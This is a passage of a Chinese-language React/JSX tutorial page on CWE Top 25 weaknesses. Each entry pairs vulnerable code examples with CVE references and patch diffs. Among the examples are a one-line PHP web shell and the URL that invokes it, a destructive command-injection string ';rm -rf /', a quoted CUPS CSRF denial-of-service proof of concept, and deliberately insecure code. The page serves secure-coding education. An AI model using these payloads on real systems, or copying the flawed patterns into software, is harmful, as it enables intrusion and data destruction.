                    远程攻击者可劫持其他用户对修改配置或更改内容请求的身份验证。
                </X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/434.html">
                【B】CWE-434: Unrestricted Upload of File with Dangerous Type
            </X.H2>
            <X.P>缺少对上传文件类型的验证。</X.P>
            <X.H3>Example 1</X.H3>
            <X.P>
                下面的代码中，前端希望用户上传一个图片，`upload_picture.php`处理上传的文件，并尝试储存在`pictures/`中。
            </X.P>
            <X.CodeBlock
                language="html"
                code={`
                <form action="upload_picture.php" method="post" enctype="multipart/form-data">
                    Choose a file to upload:
                    <input type="file" name="filename"/>
                    <br/>
                    <input type="submit" name="submit" value="Submit"/>
                </form>
                `}
            />
            <X.CodeBlock
                language="php"
                code={`
                //upload_picture.php
                ...
                // Define the target location where the picture being
                // uploaded is going to be saved.
                $target = "pictures/" . basename($_FILES['uploadedfile']['name']);
                
                // Move the uploaded file to the new location.
                if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))
                {
                    echo "The picture has been successfully uploaded.";
                }
                else
                {
                    echo "There was an error uploading the picture, please try again.";
                }
                `}
            />
            <X.P>
                上述代码的问题是没有检查传入的文件类型，以至于攻击者可以上传一份`malicious.php`，并且用它来执行系统代码：
            </X.P>
            <X.CodeBlock
                language="php"
                code={`
                <?php
                    //malicious.php
                    system($_GET['cmd']);
                ?>
                `}
            />
            <X.P>上传成功后通过类似以下形式的URL调用：</X.P>
            <X.CodeBlock language="text" code="http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l" />
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2019-1010062[https://www.opencve.io/cve/CVE-2019-1010062]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8]@
                </X.Uli>
                <X.CodeBlock
                    language="php"
                    diffAddedLines="4-8"
                    code={`
                    if (isset($_POST['submit'])) {
                        //Check if the file is JPG, PNG or GIF.
                        if (in_array($_FILES['imagefile']['type'], array('image/pjpeg', 'image/jpeg','image/png', 'image/gif'))) {
                            /* fix issue 44. Thanks to Klaus.  */
                            $imagewhitelist = array('jfif', '.png', '.jpg', '.gif', 'jpeg');  
                            if (!in_array(strtolower(substr($_FILES['imagefile']['name'], -4)), $imagewhitelist))
                                show_error($lang['general']['upload_failed'], 1);
                            /* end of fix issue 44. Thanks to Klaus.  */
                            if (!copy($_FILES['imagefile']['tmp_name'], 'images/'.$_FILES['imagefile']['name']))
                                show_error($lang['general']['upload_failed'], 1);
                            else {
                                chmod('images/'.$_FILES['imagefile']['name'], 0666);
                                ?>
                    `}
                />
                <X.P>按照补丁之前的逻辑，修改HTTP请求中的MIME类型就可以绕过原有的验证。</X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/862.html">【C】CWE-862: Missing Authorization</X.H2>
            <X.P>缺少授权，没有验证用户是否有权访问资源。</X.P>
            <X.HighlightBlock>
                <X.H3>Authentication & Authorization</X.H3>
                <X.Uli>
                    `Authentication (AuthN)`，身份认证，通常在授权之前完成，是验证“用户是谁”的过程。---
                    一般通过账号密码、人脸识别的方式。\n例如：员工通过输入用户名和密码登录公司网络。
                </X.Uli>
                <X.Uli>
                    `Authorization (AuthZ)`，授权，是确认用户是否有权访问资源。---
                    一般通过角色规则（管理员、普通用户）等方式。\n
                    例如：普通员工登录公司网络后，不能访问公司较为敏感的数据。
                </X.Uli>
            </X.HighlightBlock>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                function runEmployeeQuery($dbName, $name)
                {
                    mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);
                    //Use a prepared statement to avoid CWE-89
                    $preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');
                    $preparedStatement->execute(array(':name' => $name));
                    return $preparedStatement->fetchAll();
                }
                ...
                $employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);
                `}
            />
            <X.P>
                这段代码小心地检查了SQL注入风险（通过`prepare`函数），但却没有验证执行数据库操作的用户是否具有权限。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2022-24730[https://www.opencve.io/cve/CVE-2022-24730]@</X.Uli>
                <X.Uli>报告：@[https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v]@</X.Uli>
                <X.P withMarginTop>
                    问题的大致描述为：从v1.3.0开始，未打补丁的Argo
                    CD版本都容易受到路径遍历错误的影响，再加上不适当的访问控制错误，---
                    可能允许具有只读存储库访问权限的恶意用户从Argo CD的存储库服务器中泄露敏感文件。
                </X.P>
                <X.P>
                    有读权限的用户可以给{'`/api/v1/repositories/{repo_url}/appdetails`'}
                    发送带有恶意载荷请求以访问预期之外的文件。
                </X.P>
                <X.P noMarginBottom>补丁的作用：</X.P>
                <X.Uli>防止路径遍历；</X.Uli>
                <X.Uli>
                    <X.P noMarginBottom>
                        限制对{'`/api/v1/repositories/{repo_url}/appdetails`'}的访问权限，只有以下两类用户可以：
                    </X.P>
                    <X.Oli>拥有`create`权限的用户</X.Oli>
                    <X.Oli>拥有`get`权限的用户，并且`repo_url`已经被给定的应用使用。</X.Oli>
                </X.Uli>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/476.html">【B】CWE-476: NULL Pointer Dereference</X.H2>
            <X.P>对空指针解引用（取内容），也就是`*`运算符。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                void host_lookup(char *user_supplied_addr)
                {
                    struct hostent *hp;
                    in_addr_t *addr;
                    char hostname[64];
                    in_addr_t inet_addr(const char *cp);

                    /*routine that ensures user_supplied_addr is in the right format for conversion */

                    validate_addr_form(user_supplied_addr);
                    addr = inet_addr(user_supplied_addr);
                    hp = gethostbyaddr(addr, sizeof(struct in_addr), AF_INET);
                    strcpy(hostname, hp->h_name);
                }
                `}
            />
            <X.P>
                如果`gethostbyaddr`返回`NULL`，`hp`就是空指针，`strcpy`会导致空指针解引用。程序缺少对其返回值的检查。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2008-5183[https://www.opencve.io/cve/CVE-2008-5183]@</X.Uli>
                <X.Uli>`Exploit`：@[https://www.exploit-db.com/exploits/7150]@</X.Uli>
                <X.P withMarginTop>
                    通过CSRF发出大量`add-rss-subscription`请求，触发空指针引用（此处没有找到源码），进而导致DoS攻击。
                </X.P>
                <X.CodeBlock
                    language="js"
                    code={`
                    <!-- cat cups_dos_poc.html  -->
                    <script>
                    // make 101 CSRFed requests to CUPS daemon via 'img' tags
                    // causes CUPS daemon to crash
                    // by Adrian 'pagvac' Pastor | GNUCITIZEN.org
                    
                    for(var i=1;i<=101;++i) {
                        document.write("<img width=0 height=0 " +
                            "src=\\"http://localhost:631/admin/?OP=add-rss-subscription&SUBSCRIPTION_NAME=DOS_TEST_" +
                            i + "&PRINTER_URI=%23ALL%23&EVENT_JOB_CREATED=on&MAX_EVENTS=20\\">");
                    }
                    
                    /*
                    TESTED ON:
                    
                    Ubuntu 8.04.1 (fully patched as of 19th Oct 2008)
                    Linux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux
                    
                    openSUSE 11.0 (i586)
                    Linux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux
                    
                    Common UNIX Printing System 1.3.7
                    */
                    </script>
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/287.html">【C】CWE-287: Improper Authentication</X.H2>
            <X.P>身份认证不当，当声明拥有某个身份时，程序不足以证明该声明是正确的。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="perl"
                code={`
                my $x = new CGI;

                if ($x->cookie('loggedin') ne "true")
                {
                    if (!AuthenticateUser($x->param('username'), $x->param('password')))
                    {
                        ExitError("Error: you need to log in first");
                    }
                    else
                    {
                        #Set loggedin and user cookies.
                        $x->cookie(
                            -name = > 'loggedin',
                            -value = > 'true');
                
                        $x->cookie(
                            -name = > 'user',
                            -value = > $x->param('username'));
                    }
                }

                if ($x->cookie('user') eq "Administrator")
                {
                    DoAdministratorTasks();
                }
                `}
            />
            <X.P>使用cookie做认证，是可以直接被绕过的！</X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2022-36436[https://www.opencve.io/cve/CVE-2022-36436]@</X.Uli>
                <X.Uli>
                    `Exploit`：@[https://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/]@
                </X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b]@
                </X.Uli>
                <X.CodeBlock
                    language="python"
                    diffRemovedLines="9-10,29-31"
                    diffAddedLines="11-12"
                    code={`
                    def check_version(self, version):
                        """
                        Determine the client's version and decide whether to continue the
                        handshake.
                        """

                        if version == self.VERSION:
                            log.msg("Client version %s is valid" % version.strip())
                            # Hardcoded: 2 security types: None and VNC Auth.
                            self.transport.write("\\x02\\x01\\x02")
                            # Hardcoded: 1 security type: VNC Auth.
                            self.transport.write("\\x01\\x02")
                            return self.select_security_type, 1
                        else:
                            log.err("Can't handle VNC version %r" % version)
                            self.transport.loseConnection()

                    def select_security_type(self, security_type):
                        """
                        Choose the security type that the client wants.
                        """
                        security_type = ord(security_type)
                        if security_type == 2:
                            # VNC authentication. Issue our challenge.
                            self.challenge = urandom(16)
                            self.transport.write(self.challenge)

                            return self.vnc_authentication_result, 16
                        elif security_type == 1:
                            # No authentication. Just move to the SecurityResult.
                            self.authenticated()
                        else:
                            log.err("Couldn't agree on an authentication scheme!")
                            self.transport.loseConnection()
                    `}
                />
                <X.P>
                    `\x02\x01\x02`分别代表支持的列表长度、列表内容，原先可能因为某些原因支持无认证模式访问，存在漏洞利用风险。
                </X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/190.html">
                【B】CWE-190: Integer Overflow or Wraparound
            </X.H2>
            <X.P>
                整数溢出或整数回绕，当有符号数相加超过正负值上限时可能发生溢出；当无符号数相加超过上限就会从`0`开始“回绕”；---
                或者计算`unsigned(0) - 1`时，会得到最大值。
            </X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                img_t table_ptr; /*struct containing img data, 10kB each*/
                int num_imgs;
                ...
                num_imgs = get_num_imgs();
                table_ptr = (img_t *)malloc(sizeof(img_t) * num_imgs);
                ...
                `}
            />
            <X.P>随着`num_imgs`增大，乘积计算结果可能发生回绕，导致最终分配了一个很小的内存空间。</X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                short int bytesRec = 0;
                char buf[SOMEBIGNUM];

                while (bytesRec < MAXGET)
                {
                    bytesRec += getFromInput(buf + bytesRec);
                }
                `}
            />
            <X.P>
                `bytesRec`定义为`short int`类型，当`MAXGET`很大时，很可能导致`bytesRec`溢出（永远小于`MAXGET`），---
                循环不会终止，并不断地覆盖`buf`中的内容。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2018-20330[https://www.opencve.io/cve/CVE-2018-20330]@</X.Uli>
                <X.Uli>`Exploit`：@[https://github.com/libjpeg-turbo/libjpeg-turbo/issues/304]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3]@
                </X.Uli>
                <X.CodeBlock
                    language="c"
                    diffRemovedLines="2"
                    diffAddedLines="3-5"
                    code={`
                    pitch = PAD((*width) * tjPixelSize[*pixelFormat], align);
                    if ((dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)
                    if ((unsigned long long)pitch * (unsigned long long)(*height) >
                        (unsigned long long)((size_t)-1) ||
                        (dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)
                      _throwg("tjLoadImage(): Memory allocation failure");                  
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/502.html">
                【B】CWE-502: Deserialization of Untrusted Data
            </X.H2>
            <X.P>反序列化不受信任的数据，也就是没有检查反序列化后的结果是否是有效的。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="java"
                code={`
                try
                {
                    File file = new File("object.obj");
                    ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
                    javax.swing.JButton button = (javax.swing.JButton)in.readObject();
                    in.close();
                }
                `}
            />
            <X.P>如果攻击者替换了文件内容，可能导致风险。`readObject()`应当做如下改进：</X.P>
            <X.CodeBlock
                language="java"
                code={`
                private final void readObject(ObjectInputStream in) throws java.io.IOException
                {
                    throw new java.io.IOException("Cannot be deserialized");
                }
                `}
            />
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="python"
                code={`
                class ExampleProtocol(protocol.Protocol):
                    def dataReceived(self, data):
                        # Code that would be here would parse the incoming data
                        # After receiving headers, call confirmAuth() to authenticate
                        pass

                    def confirmAuth(self, headers):
                        try:
                            token = cPickle.loads(base64.b64decode(headers['AuthToken']))
                            if not check_hmac(token['signature'], token['data'], getSecretKey()):
                                raise AuthFail
                            self.secure_data = token['data']
                        except:
                            raise AuthFail
                `}
            />
            <X.P>
                这段代码没有验证传入数据是否合法。攻击者可以构造一个非法的序列化对象`AuthToken`，该对象通过实例化Python的子进程之一来执行任意命令。---
                例如，攻击者可以构建一个利用Python子进程模块的`pickle`，该模块会生成新进程并包含许多用于各种用途的参数。---
                由于`Pickle`库允许对象定义如何`unpickle`，因此攻击者可以指示`unpickle`进程在子进程模块中调用`Popen`并执行`/bin/sh`。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2020-13091[https://www.opencve.io/cve/CVE-2020-13091]@</X.Uli>
                <X.P withMarginTop>
                    如果`__reduce__`调用了`os.system`，1.0.3版本的Python Pandas库可以从传递给---
                    `read_pickle()`函数的不信任文件中反序列化，并执行命令。注意`read_pickle()`在---
                    @文档[https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_pickle.html]@---
                    中已经被标记为不安全的，用户有责任确保传入的文件是可信的。
                </X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/77.html">
                【C】CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
            </X.H2>
            <X.P>命令注入，用户输入没有被中和，或错误地中和处理，导致执行的预期命令被修改。</X.P>
            <X.P noMarginBottom>命令注入漏洞通常发生在以下情况：</X.P>
            <X.Uli>数据从不受信任的来源进入应用程序。</X.Uli>
            <X.Uli>数据是字符串的一部分，由应用程序作为命令执行。</X.Uli>
            <X.Uli>通过执行命令，应用程序为攻击者提供了其原本无法拥有的权限或能力。</X.Uli>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                int main(int argc, char **argv)
                {
                    char cmd[CMD_MAX] = "/usr/bin/cat ";
                    strcat(cmd, argv[1]);
                    system(cmd);
                }
                `}
            />
            <X.P>
                上述程序出于对运维人员的教学目的将会以管理员权限执行。此时有命令注入的风险，例如传入`";rm -rf /"`。
            </X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="java"
                code={String.raw`
                String btype = request.getParameter("backuptype");
                String cmd = new String("cmd.exe /K \" c:\\util\\rmanDB.bat "
                    +btype+
                    "&&c:\\utl\\cleanup.bat\""
                )
                
                System.Runtime.getRuntime().exec(cmd);
                `}
            />
            <X.P>原因是类似的，`btype`参数有被注入的风险。</X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2024-32027[https://www.opencve.io/cve/CVE-2024-32027]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1]@
                </X.Uli>
                <X.P withMarginTop>此补丁移除了很多Python脚本中的`shell=True`：</X.P>
                <X.CodeBlock
                    language="python"
                    diffRemovedLines="1"
                    diffAddedLines="2"
                    code={`
                    subprocess.run(run_cmd, shell=True, env=env)
                    subprocess.run(run_cmd, env=env)
                    `}
                />
                <X.P>
                    不加`shell=True`时，命令作为列表直接传递给操作系统，例如：`subprocess.run(['ls', '-l'])`；
                    这是更安全的。\n使用`shell=True`时，命令通过解释器（例如`/bin/sh`或`cmd.exe`）运行，例如：---
                    `subprocess.run('ls -l', shell=True)`；这可能导致命令注入。
                </X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/119.html">
                【C】CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
            </X.H2>
            <X.P>
                缓冲区范围内的操作限制不当，产品对内存缓冲区执行操作，但它可以从缓冲区预期边界之外的内存位置读取或写入。
            </X.P>
            <X.P>包括前面提到的越界读取和越界写入。范围较为广泛，这里不详细展开了。</X.P>
            <X.H2 href="https://cwe.mitre.org/data/definitions/798.html">
                【B】CWE-798: Use of Hard-coded Credentials
            </X.H2>
            <X.P>使用硬编码的凭证，即凭证在源代码中直接出现。</X.P>
            <X.H3>Example 1</X.H3>
            <X.P>下面的代码硬编码了用户名和密码去连接数据库：</X.P>
            <X.CodeBlock
                language="java"
                code={`
                ...
                DriverManager.getConnection(url, "scott", "tiger");
                ...
                `}
            />
            <X.P>
                有权限访问到此源码的员工可以利用这点闯入系统。更坏的情况是如果攻击者能够访问到程序的字节码，---
                可以使用`javap -c`命令反汇编，得到明文密码，例如：
            </X.P>
            <X.CodeBlock
                language="text"
                code={`
                javap -c ConnMngr.class
                22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
                24: ldc #38; //String scott
                26: ldc #17; //String tiger
                `}
            />
            <X.H3>Example 2</X.H3>
            <X.P>硬编码加密后的密码同样是有问题的。理由同上，只要在源程序中明文出现，都会有很大的风险。</X.P>
            <X.CodeBlock
                language="c"
                code={`
                int VerifyAdmin(char *password)
                {
                    if (strcmp(password, "68af404b513073584c4b6f22b6c63e6b"))
                    {
                        printf("Incorrect Password!\\n");
                        return (0);
                    }
                    printf("Entering Diagnostic Mode...\\n");
                    return (1);
                }
                `}
            />
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2020-35296[https://www.opencve.io/cve/CVE-2020-35296]@</X.Uli>
                <X.Uli>`Exploit`：@[https://github.com/Shrimant12/CVE-References/blob/main/CVE-2020-35296.md]@</X.Uli>
                <X.P withMarginTop>管理员面板有默认账户`admin:admin`。</X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/918.html">
                【B】CWE-918: Server-Side Request Forgery (SSRF)
            </X.H2>
            <X.P>
                服务端请求伪造，攻击者通过伪造服务器发起的请求，使服务器端的应用程序访问受信任的第三方服务器或资源。---
                通常，攻击者利用此漏洞访问内部系统。SSRF可以看作一种跳板攻击。
            </X.P>
            <X.Image src="ssrf.jpg" width="800px" invertInDarkTheme />
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2024-3149[https://www.opencve.io/cve/CVE-2024-3149]@</X.Uli>
                <X.Uli>`Exploit`：@[https://huntr.com/bounties/b230d76b-ae2d-440e-a25b-94ffaa7c4ff1]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/mintplex-labs/anything-llm/commit/f4088d9348fa86dcebe9f97a18d39c0a6e92f15e]@
                </X.Uli>
                <X.P withMarginTop>
                    AnythingLLM的上传链接功能存在SSRF漏洞，该功能面向具有`manager`或`admin`角色的用户，---
                    使用无头浏览器通过内部`collectorApi`处理上传的链接。
                    攻击者可以通过托管恶意网站并使用该网站执行内部端口扫描、访问未对外公开的内部网络应用程序等操作来利用这一漏洞。
                </X.P>
                <X.P>部署AnytingLLM后会有两个`express.js`节点运行，分别是`collector`和`server`。</X.P>
                <X.P>
                    补丁引入了`comKey`检验数据完整性，让攻击者无法构造出合法的请求头部。部分新增的内容如下：\n`collector/utils/comKey/index.js`：
                </X.P>
                <X.CodeBlock
                    language="js"
                    code={`
                    const crypto = require("crypto");
                    const fs = require("fs");
                    const path = require("path");

                    const keyPath =
                      process.env.NODE_ENV === "development"
                        ? path.resolve(__dirname, \`../../../server/storage/comkey\`)
                        : path.resolve(process.env.STORAGE_DIR, \`comkey\`);
                    
                    class CommunicationKey {
                      #pubKeyName = "ipc-pub.pem";
                      #storageLoc = keyPath;

                      constructor() {}

                      log(text, ...args) {
                        console.log(\`\\x1b[36m[CommunicationKeyVerify]\\x1b[0m \${text}\`, ...args);
                      }

                      #readPublicKey() {
                        return fs.readFileSync(path.resolve(this.#storageLoc, this.#pubKeyName));
                      }

                      // Given a signed payload from private key from /app/server/ this signature should
                      // decode to match the textData provided. This class does verification only in collector.
                      // Note: The textData is typically the JSON stringified body sent to the document processor API.
                      verify(signature = "", textData = "") {
                        try {
                          let data = textData;
                          if (typeof textData !== "string") data = JSON.stringify(data);
                          return crypto.verify(
                            "RSA-SHA256",
                            Buffer.from(data),
                            this.#readPublicKey(),
                            Buffer.from(signature, "hex")
                          );
                        } catch {}
                        return false;
                      }
                    }

                    module.exports = { CommunicationKey };
                    `}
                />
                <X.P>`server/utils/comKey/index.js`：</X.P>
                <X.CodeBlock
                    language="js"
                    highlightLines="9-17"
                    code={`
                    const crypto = require("crypto");
                    const fs = require("fs");
                    const path = require("path");
                    const keyPath =
                      process.env.NODE_ENV === "development"
                        ? path.resolve(__dirname, \`../../storage/comkey\`)
                        : path.resolve(process.env.STORAGE_DIR, \`comkey\`);

                    // What does this class do?
                    // This class generates a hashed version of some text (typically a JSON payload) using a rolling RSA key
                    // that can then be appended as a header value to do integrity checking on a payload. Given the
                    // nature of this class and that keys are rolled constantly, this protects the request
                    // integrity of requests sent to the collector as only the server can sign these requests.
                    // This keeps accidental misconfigurations of AnythingLLM that leaving port 8888 open from
                    // being abused or SSRF'd by users scraping malicious sites who have a loopback embedded in a <script>, for example.
                    // Since each request to the collector must be signed to be valid, unsigned requests directly to the collector
                    // will be dropped and must go through the /server endpoint directly.
                    class CommunicationKey {
                      #privKeyName = "ipc-priv.pem";
                      #pubKeyName = "ipc-pub.pem";
                      #storageLoc = keyPath;

                      // Init the class and determine if keys should be rolled.
                      // This typically occurs on boot up so key is fresh each boot.
                      constructor(generate = false) {
                        if (generate) this.#generate();
                      }

                      log(text, ...args) {
                        console.log(\`\\x1b[36m[CommunicationKey]\\x1b[0m \${text}\`, ...args);
                      }

                      #readPrivateKey() {
                        return fs.readFileSync(path.resolve(this.#storageLoc, this.#privKeyName));
                      }

                      #generate() {
                        const keyPair = crypto.generateKeyPairSync("rsa", {
                          modulusLength: 2048,
                          publicKeyEncoding: {
                            type: "pkcs1",
                            format: "pem",
                          },
                          privateKeyEncoding: {
                            type: "pkcs1",
                            format: "pem",
                          },
                        });

                        if (!fs.existsSync(this.#storageLoc))
                          fs.mkdirSync(this.#storageLoc, { recursive: true });
                        fs.writeFileSync(
                          \`\${path.resolve(this.#storageLoc, this.#privKeyName)}\`,
                          keyPair.privateKey
                        );
                        fs.writeFileSync(
                          \`\${path.resolve(this.#storageLoc, this.#pubKeyName)}\`,
                          keyPair.publicKey
                        );
                        this.log(
                          "RSA key pair generated for signed payloads within AnythingLLM services."
                        );
                      }

                      // This instance of ComKey on server is intended for generation of Priv/Pub key for signing and decoding.
                      // this resource is shared with /collector/ via a class of the same name in /utils which does decoding/verification only
                      // while this server class only does signing with the private key.
                      sign(textData = "") {
                        return crypto
                          .sign("RSA-SHA256", Buffer.from(textData), this.#readPrivateKey())
                          .toString("hex");
                      }
                    }

                    module.exports = { CommunicationKey };
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/306.html">
                【B】CWE-306: Missing Authentication for Critical Function
            </X.H2>
            <X.P>重要功能没有做权限认证。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="java"
                highlightLines="1,3-9,15"
                code={`
                private boolean isUserAuthentic = false;

                public boolean authenticateUser(String username, String password)
                {
                    // authenticate user,
                    // if user is authenticated then set variable to true
                    // otherwise set variable to false
                    ...
                }

                public BankAccount createNewBankAccount(String accountNumber, String accountType, String accountName, String accountSSN, double balance)
                {
                    BankAccount account = null;
                
                    if (isUserAuthentic)
                    {
                        account = new BankAccount();
                        account.setAccountNumber(accountNumber);
                        account.setAccountType(accountType);
                        account.setAccountOwnerName(accountName);
                        account.setAccountOwnerSSN(accountSSN);
                        account.setBalance(balance);
                    }
                    return account;
                }
                `}
            />
            <X.P>上面代码中高亮的部分是*正确*的做法。如果忽视了验证，就存在风险了。</X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2020-25966[https://www.opencve.io/cve/CVE-2020-25966]@</X.Uli>
                <X.Uli>`Exploit`：@[https://gitlab.com/Gazzaz/Spectra_API_Issue/]@</X.Uli>
                <X.P withMarginTop>
                    Sectona Spectra 3.2.0存在一个易受攻击的SOAP API端点，---
                    该端点会在未进行适当身份验证的情况下泄漏敏感信息。
                </X.P>
                <X.P>注：这个CVE是由于系统配置错误导致的。</X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/362.html">
                【C】CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race
                Condition')
            </X.H2>
            <X.P>
                数据竞争，某段代码需要对共享资源进行临时、独占访问，但存在一个时间窗口，在该时间窗口内共享资源可被同时运行的另一个代码片段修改。
            </X.P>
            <X.P noMarginBottom>数据竞争违反了以下两个原则：</X.P>
            <X.Uli>
                排他性：代码序列被赋予对共享资源的排他性访问权限，即在原始序列完成执行之前，其他代码序列不能修改共享资源的属性。
            </X.Uli>
            <X.Uli>
                <X.P noMarginBottom>
                    原子性：代码序列被视为一个单一的操作，即在执行期间不会被中断，也不会被其他代码序列中断。
                </X.P>
                <X.P>
                    程序员可能会认为某些代码序列执行得太快，不会受到干扰代码序列的影响，但事实并非如此。---
                    例如，单个`x++`语句在代码层可能看起来是原子的，但在指令层实际上是非原子的，因为它涉及读取`x`的原始值、---
                    计算`x+1`、最后将结果赋值给`x`。
                </X.P>
            </X.Uli>
            <X.P withMarginTop>
                干扰代码序列可以是可信的或不可信的。受信任的干扰代码序列出现在产品内部，攻击者无法修改，只能间接调用。---
                不受信任的干扰代码序列可由攻击者直接编写，通常在易受攻击产品的外部。
            </X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="perl"
                code={`
                $transfer_amount = GetTransferAmount();
                $balance = GetBalanceFromDatabase();
                
                if ($transfer_amount < 0)
                {
                    FatalError("Bad Transfer Amount");
                }
                $newbalance = $balance - $transfer_amount;
                if (($balance - $transfer_amount) < 0)
                {
                    FatalError("Insufficient Funds");
                }
                SendNewBalanceToDatabase($newbalance);
                NotifyUser("Transfer of $transfer_amount succeeded.");
                NotifyUser("New balance: $newbalance");
                `}
            />
            <X.P>这个例子中`GetBalanceFromDatabase()`和`SendNewBalanceToDatabase()`可能会发生数据竞争。</X.P>
            <X.P noMarginBottom>假设初始余额`balance`是`100.00`，一个攻击可以构造如下：</X.P>
            <X.Oli>攻击者调起两个程序，`PROGRAM-1`和`PROGRAM-2`，使用同一账户。</X.Oli>
            <X.Oli>`PROGRAM-1`请求转账`80.00`，此时`PROGRAM-1`计算出`$newbalance`为`20.00`。</X.Oli>
            <X.Oli>`PROGRAM-1`调用`SendNewBalanceToDatabase(20.00)`，但是*受到了延迟*。</X.Oli>
            <X.Oli>`PROGRAM-2`请求转账`1.00`，同理计算出`$newbalance`为`99.00`。</X.Oli>
            <X.Oli>`PROGRAM-2`调用`SendNewBalanceToDatabase(99.00)`。</X.Oli>
            <X.Oli>`PROGRAM-1`调用的`SendNewBalanceToDatabase(20.00)`提交到数据库。</X.Oli>
            <X.Oli>`PROGRAM-2`调用的`SendNewBalanceToDatabase(99.00)`提交到数据库。</X.Oli>
            <X.P withMarginTop>最后导致数据库记录的余额是错误的。</X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="c"
                code={`
                void f(pthread_mutex_t *mutex)
                {
                    pthread_mutex_lock(mutex);
                    
                    /* access shared resource */ 
                    
                    pthread_mutex_unlock(mutex);
                }
                `}
            />
            <X.P>
                上面的函数尝试获取锁，以便对共享资源执行操作。不过上述函数没有检查`pthread_mutex_lock()`是否正常返回。---
                如果因为一些原因导致`pthread_mutex_lock()`失败，那么这个例子会导致数据竞争。
            </X.P>
            <X.P>正确的做法是：</X.P>
            <X.CodeBlock
                language="c"
                code={`
                int f(pthread_mutex_t *mutex)
                {
                    int result;
                
                    result = pthread_mutex_lock(mutex);
                    if (0 != result)
                        return result;
                
                    /* access shared resource */
                
                    return pthread_mutex_unlock(mutex);
                }
                `}
            />
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2024-24254[https://www.opencve.io/cve/CVE-2024-24254]@</X.Uli>
                <X.Uli>
